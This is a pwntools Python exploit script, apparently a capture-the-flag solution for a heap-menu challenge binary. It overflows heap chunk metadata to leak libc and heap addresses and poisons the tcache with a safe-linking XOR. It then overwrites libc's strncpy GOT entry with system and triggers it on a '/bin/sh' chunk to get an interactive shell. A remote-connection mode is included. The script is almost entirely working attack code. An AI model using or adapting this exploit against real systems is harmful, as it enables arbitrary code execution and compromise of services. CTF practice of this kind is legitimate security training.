from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
target = ''

file_name = './chall_patched'
libc_name = './libc.so.6'

elf = ELF(file_name)
context.binary = elf
libc = ELF(libc_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1
error  = 1 if ('error'  in sys.argv)     else 0

if debug:
    context(log_level='debug')

if error:
    context(log_level='error')

bps = [
# 0x1234,
# 'main',
# (0xe3b31, 'libc'), 
# ('system', 'libc')
]

gdb_cmd = ''
if gdb_ and switch == 0:
    gdb_cmd += "set breakpoint pending on\n"
    for b in bps:
       if isinstance(b, int):
           gdb_cmd += f"b *$rebase({hex(b)})\n"
       elif isinstance(b, str):
           gdb_cmd += f"b {b}\n"
       elif isinstance(b, tuple) and len(b) == 2 and b[1] == 'libc':
           if 'libc' in locals() and libc:
                target = libc.sym[b[0]] if isinstance(b[0], str) else b[0]
                gdb_cmd += f'b *($base("libc") + {hex(target)})\n'
           else:
                log.warning("未加载 Libc,跳过 Libc 断点")
    gdb_cmd += "c\n"

if switch:
   parts = target.replace(':', ' ').split()
   host = parts[-2]
   port   = int(parts[-1])
   p = remote(host, port)
elif gdb_:
   p = gdb.debug(file_name, gdbscript=gdb_cmd, aslr=True)
else:
   p = process(file_name)

def s(data):             return p.send(data)
def sa(delim, data):     return p.sendafter(delim, data)
def sl(data):            return p.sendline(data)
def sla(delim, data):    return p.sendlineafter(delim, data)
def r(numb=4096):        return p.recv(numb)
def ru(delim, drop=True):return p.recvuntil(delim, drop)
def rl(bool = False):    return p.recvline(keepends=bool)
def ra(t=None):          return p.recvall(timeout=t)
def cl():                return p.close()
def it():                return p.interactive()
def uc64(data):          return u64(data.rjust(8, b'\x00'))
def uu64(data):          return u64(data.ljust(8, b'\x00'))
def a(f, off=libc):      return lg(hex(off), (ret := f.address + off)) or ret
def cb(data):            return data if isinstance(data, bytes) else str(data).encode()
def lg(name, data):      return log.success(name + ': ' + (hex(data) if isinstance(data, int) else data.decode(errors='ignore') if isinstance(data, bytes) else str(data)))
def menu(idx, pmt=b'>'): return sla(pmt, str(idx).encode())
def ntlb(leak, offset, name='Libc'):  return setattr(libc, 'address', leak - (libc.sym[offset] if isinstance(offset, str) else offset)) or lg(name, libc.address)
def ntpie(leak, offset, name='PIE'):  return setattr(elf, 'address', leak - (elf.sym[offset] if isinstance(offset, str) else offset)) or lg(name, elf.address)
def fill(num, content=b'A'):          return (content.encode() if isinstance(content, str) else content) * num
def se(s, f=None):                    return lg(s if isinstance(s, str) else f"bytes: {s.hex()}", (addr := next((f or libc).search(s if isinstance(s, bytes) else s.encode())))) or addr

_rop_cache = {}
def gg(s, f=None):
   target = f or libc
   if target not in _rop_cache:
       _rop_cache[target] = ROP(target)
   rop = _rop_cache[target]
   instrs = [x.strip() for x in s.split(';')]
   gadget = rop.find_gadget(instrs)
   if gadget:
       addr = gadget.address
       lg(s, addr)
       return addr
   else:
       raise ValueError(f"[-] Critical: Gadget not found: {s}")

def ga(delim=b'|', name='Leak', data=None):
    target_data = data if data else ru(delim)
    if isinstance(target_data, str):
        target_data = target_data.encode()
    hex_list = re.findall(b'0x[0-9a-fA-F]+', target_data)
    return [lg(f'{name}[{i}]', x) or x for i, x in enumerate([int(a, 16)for a in hex_list])]
#################################################################################

def create(idx, sizee, content):
    menu(1)
    sla(b'Index: ', cb(idx))
    sla(b'Size: ', cb(sizee))
    sa(b'Data: ', content)

def delete(idx):
    menu(2)
    sla(b'Index: ', cb(idx))

def show(idx):
    menu(3)
    sla(b'Index: ', cb(idx))

def exit():
    menu(4)


for i in range(8):
    create(0, 0xc, b'A')
    create(1, 0xc, b'B')
    delete(0)
    payload1 = flat([
        fill(0x10 + i * 0x20),
        p64(0x20) + p64(0x201),
        fill(0x18),
        0x20d31 - i * 0x20
    ])
    if i == 7:
        payload1 += flat([
            fill(0x1d8),
            0x21,
            fill(0x18),
            0x21
        ])
    create(0, 4, payload1)
    delete(1)
    delete(0)
create(0, 4, fill(0x100))
show(0)
data = rl()
leak = uu64(data[0x100:])
ntlb(leak, 0x21ace0 )
payload2 = flat([
    fill(0xf8),
    0x21,
    leak, leak,
    0x20,
    0x20c50#  - unsorted header 在 0x...b390- 改成 0x20 chunk 后，下一个 chunk 头就是 0x...b3b0, 0x21000 - 0x3b0 = 0x20c50
])
delete(0)
create(0, 4, payload2)
create(1, 0xc, b'X')
delete(1)
delete(0)
create(0, 4, b'A' * 0x100)
show(0)
data1 = rl()
leak1 = uu64(data1[0x100:])
lg('Heap', leak1)
delete(0)
payload3 = flat([
    fill(0xf8),
    0x21,
])
create(0, 4, payload3)
delete(0)
create(0, 0x20, b'A')
create(1, 0x20, b'B')
delete(1)
delete(0)
strncpy_got = libc.got['strncpy']
fake_fd = strncpy_got ^ leak1
payload4 = flat([
    fill(0x118),
    0x31,
    fake_fd
])
create(0, 4, payload4)
create(1, 0x20, b'/bin/sh\x00')
delete(0)
create(0, 0x20, flat([libc.sym['strncpy'], libc.sym['system']]))
show(1)
it()





    
